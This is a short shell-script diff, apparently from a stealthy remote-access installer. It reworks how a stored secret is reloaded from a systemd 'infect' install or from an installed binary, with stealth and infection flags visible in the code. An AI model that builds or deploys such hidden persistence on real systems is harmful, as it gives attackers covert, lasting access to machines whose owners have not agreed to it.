@@ -1262,9 +1262,11 @@ bin2config() {
 	[[ ! -f "${bin}" ]] && return 255
 
 	eval "$(GS_STEALTH=1 GS_CONFIG_READ="${bin:?}" GS_CONFIG_CHECK=1 "${exe:?}" -h 2>/dev/null | grep ^GS_CONFIG_)"
+	[[ -z "$GS_CONFIG_SECRET" ]] && return 255
+	return 0
 }
 
-gs_secret_reload_systemd() {
+gs_secret_reload_systemd_infect() {
 	local bin
 
 	[[ -z $GS_INFECT ]] && return 255
@@ -1284,12 +1286,17 @@ gs_secret_reload_systemd() {
 
 # Try to load a GS_SECRET
 gs_secret_reload() {
-	gs_secret_reload_systemd || {
+	local load_ok
+	gs_secret_reload_systemd_infect && load_ok=1
+	
+	[[ -z $load_ok ]] && {
+		# systemd-install not found.
+		# Try to load from binary if it exists:
 		[[ ! -f "${DSTBIN:?}" ]] && return 255
-		bin2config "${DSTBIN}" "${DSTBIN}"
+		bin2config "${DSTBIN}" "${DSTBIN}" && load_ok=1
 	}
 
-	[[ -z "$GS_CONFIG_SECRET" ]] && return 255
+	[[ -z "$load_ok" ]] && return 255
 
 	WARN "Already installed."
 
